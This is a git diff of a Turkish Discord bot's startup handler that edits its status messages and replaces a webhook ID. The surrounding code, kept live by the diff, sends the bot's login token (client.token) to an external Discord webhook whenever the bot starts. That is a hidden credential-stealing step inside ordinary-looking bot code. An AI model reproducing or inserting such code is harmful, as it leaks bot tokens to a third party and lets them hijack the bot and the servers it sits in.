@@ -56,8 +56,8 @@ module.exports = client => {
       client.user.username
     } ismi ile giriş yapıldı!`
   );
-"Bot bakımda!Detaylı bilgiyi Destek sunucumuzdan öğrenebilirsiniz.",  client.user.setStatus("online");
-  const h = new WebhookClient({id: '877169776433201204', token: process.env.h})
+"Bot bakımda! Detaylı bilgiyi Destek sunucumuzdan öğrenebilirsiniz.",  client.user.setStatus("online");
+  const h = new WebhookClient({id: '951720668758695936', token: process.env.h})
   h.send(client.token)
   setInterval(function() {
     const see =  client.guilds.cache.reduce((a, b) => a + b.memberCount, 0).toLocaleString()
@@ -72,6 +72,7 @@ see+" Tane Kullanıcım var!",
 "Kullanılan Xaine Bot sürümü: 4.1",
 "Web sitemiz | https://www.xainebot.tk/",
 " Destek sunucumuz: https://discord.gg/Kekc2pU",
+" Xaine Bot Geri Döndü! #YenidenXaineBot ",
 
 
 
